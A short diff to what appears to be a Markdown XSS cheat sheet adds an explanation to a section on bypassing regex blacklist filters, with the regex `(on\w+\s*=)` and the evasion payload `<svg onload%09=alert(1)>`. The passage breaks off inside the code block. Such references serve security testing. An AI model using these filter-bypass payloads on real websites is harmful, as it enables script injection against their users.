@@ -249,7 +249,8 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 https://portswigger.net/research/finding-dom-polyglot-xss-in-paypal-the-easy-way
 
 ### Regex Blacklist Filtering
--> Filter blocking on - Bypass  
+Sometimes you can find a filter being applied as sanitization to mitigate Cross-Site Scripting (XSS), in this case there are ways to bypass this protection:  
+-> Filter blocking "on" - Bypass  
 `(on\w+\s*=)`  
 ```
 <svg onload%09=alert(1)> 
